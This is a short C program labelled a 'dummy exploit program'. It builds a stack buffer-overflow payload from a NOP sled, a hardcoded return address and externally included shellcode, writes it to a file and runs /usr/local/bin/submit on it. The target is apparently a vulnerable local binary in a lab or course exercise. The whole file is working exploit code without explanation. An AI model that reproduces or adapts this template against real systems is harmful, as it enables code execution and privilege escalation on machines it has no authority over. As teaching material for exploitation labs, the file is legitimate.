/*
 * dummy exploit program
 */

#include <stdio.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define BUF_SIZE (540)
#define NOP (0x90)

int main(int argc, char **argv) {
	char buf[BUF_SIZE], *it, *args[4];
	int i;
	const int slen = strlen(shellcode);
	const int halfway = BUF_SIZE / 2;
	long *addr_ptr;
	FILE *dest;
	long *addr = (long*) 0xffbfdc58;

	addr_ptr = (long*) buf;
	for (i = 0; i < BUF_SIZE; i+=4) {
		*(addr_ptr++) = (long) addr;
	}

	memset(buf, NOP, halfway);

	it = buf + (halfway - slen/2);
	memcpy(it, shellcode, slen);

	if ((dest = fopen("out", "w+")) == NULL) {
		puts("Cannot open 'out' for writing the shellcode");
		return 1;
	}

	fprintf(dest, "%s", buf);
	fclose(dest);

	args[0] = "/usr/local/bin/submit";
	args[1] = "out";
	args[2] = "whatever";
	args[3] = NULL;

	execve("/usr/local/bin/submit", args, NULL);

	// MUST NOT REACH
	return 1;
}
